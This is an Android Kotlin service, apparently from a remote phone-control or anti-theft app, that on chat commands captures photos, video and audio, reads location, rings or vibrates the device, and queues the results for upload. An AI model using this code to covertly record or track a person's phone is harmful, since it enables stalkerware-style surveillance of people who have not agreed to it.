package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.RingtoneManager
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class ForegroundActionService : Service() {
    private var overlayView: OverlayCameraView? = null
    private var job: Job? = null

    override fun onCreate() {
        super.onCreate()
        val notification = NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
            .setContentTitle("Remote Control Service")
            .setContentText("Running background actions...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.getStringExtra("action") ?: ""
        val chatId = intent?.getStringExtra("chat_id")
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            try {
                when (action) {
                    "photo" -> handleCameraAction("photo", intent, chatId)
                    "video" -> handleCameraAction("video", intent, chatId)
                    "audio" -> handleAudioRecording(intent, chatId)
                    "location" -> handleLocation(chatId)
                    "ring" -> handleRing() // Always 5 seconds
                    "vibrate" -> handleVibrate() // Always 2 seconds
                    else -> Log.e("ForegroundActionService", "Unknown action: $action")
                }
            } catch (e: Exception) {
                Log.e("ForegroundActionService", "Error in action $action", e)
            } finally {
                removeCameraOverlay()
            }
        }
        return START_NOT_STICKY
    }

    private suspend fun handleCameraAction(type: String, intent: Intent?, chatId: String?) {
        showCameraOverlay()
        val cameraFacing = intent?.getStringExtra("camera") ?: "rear"
        val flash = intent?.getBooleanExtra("flash", false) ?: false
        val quality = intent?.getIntExtra("quality", 720) ?: 720
        val duration = intent?.getIntExtra("duration", 60) ?: 60 // For video only
        val outputFile = File(cacheDir, generateFileName(type, quality))
        val result: Boolean
        try {
            result = CameraBackgroundHelper.takePhotoOrVideo(
                context = this,
                surfaceHolder = overlayView!!.holder,
                type = type,
                cameraFacing = cameraFacing,
                flash = flash,
                videoQuality = quality,
                durationSec = duration,
                file = outputFile
            )
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Camera error: $e")
            return
        } finally {
            removeCameraOverlay()
        }
        if (result && chatId != null) {
            UploadManager.queueUpload(outputFile, chatId, type)
        }
    }

    private suspend fun handleAudioRecording(intent: Intent?, chatId: String?) {
        val duration = intent?.getIntExtra("duration", 60) ?: 60 // Default 1 min
        val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
        try {
            AudioBackgroundHelper.recordAudio(this, outputFile, duration)
            if (chatId != null) {
                UploadManager.queueUpload(outputFile, chatId, "audio")
            }
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Audio error: $e")
        }
    }

    private suspend fun handleLocation(chatId: String?) {
        try {
            val loc = LocationBackgroundHelper.getLastLocation(this)
            if (loc == null) {
                Log.e("ForegroundActionService", "Location unavailable")
                return
            }
            val locationFile = File(cacheDir, "location_${nowString()}.json")
            FileOutputStream(locationFile).use { out ->
                out.write("""{"lat":${loc.latitude},"lng":${loc.longitude},"timestamp":${loc.time}}""".toByteArray())
            }
            if (chatId != null) {
                UploadManager.queueUpload(locationFile, chatId, "location")
            }
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Location error: $e")
        }
    }

    private fun handleRing() {
        val duration = 5 // seconds, hardcoded as requested
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val oldVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING)
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
        try {
            audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolume, 0)
            val ringtone = RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE))
            ringtone.play()
            Handler(Looper.getMainLooper()).postDelayed({
                ringtone.stop()
                audioManager.setStreamVolume(AudioManager.STREAM_RING, oldVolume, 0)
            }, (duration * 1000).toLong())
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Ring error: $e")
        }
    }

    private fun handleVibrate() {
        val duration = 2000L // milliseconds, hardcoded as requested (2s)
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                vibrator.vibrate(duration)
            }
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Vibrate error: $e")
        }
    }

    private fun showCameraOverlay() {
        if (overlayView == null) {
            overlayView = OverlayCameraView(this)
            overlayView?.addToWindow()
        }
    }
    private fun removeCameraOverlay() {
        overlayView?.removeFromWindow()
        overlayView = null
    }
    override fun onDestroy() {
        job?.cancel()
        removeCameraOverlay()
        super.onDestroy()
    }
    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        fun start(context: Context) {
            val intent = Intent(context, ForegroundActionService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun stop(context: Context) {
            context.stopService(Intent(context, ForegroundActionService::class.java))
        }
        fun isRunning(context: Context): Boolean = false

        fun startCameraAction(context: Context, type: String, options: JSONObject, chatId: String?) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", type)
            intent.putExtra("camera", options.optString("camera", "rear"))
            if (options.has("flash")) intent.putExtra("flash", options.optBoolean("flash", false))
            if (type == "video") {
                if (options.has("quality")) intent.putExtra("quality", options.optInt("quality", 720))
                if (options.has("duration")) intent.putExtra("duration", options.optInt("duration", 60))
            }
            chatId?.let { intent.putExtra("chat_id", it) }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startAudioAction(context: Context, options: JSONObject, chatId: String?) {
            val duration = options.optInt("duration", 60)
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "audio")
            intent.putExtra("duration", duration)
            chatId?.let { intent.putExtra("chat_id", it) }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startLocationAction(context: Context, chatId: String?) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "location")
            chatId?.let { intent.putExtra("chat_id", it) }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startRingAction(context: Context, options: JSONObject) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "ring")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startVibrateAction(context: Context, options: JSONObject) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "vibrate")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun generateFileName(type: String, quality: Int): String {
            val sdf = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
            return if (type == "video") {
                "${type}_${quality}p_${sdf.format(Date())}.mp4"
            } else {
                "${type}_${sdf.format(Date())}.jpg"
            }
        }
        fun nowString(): String = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
    }
}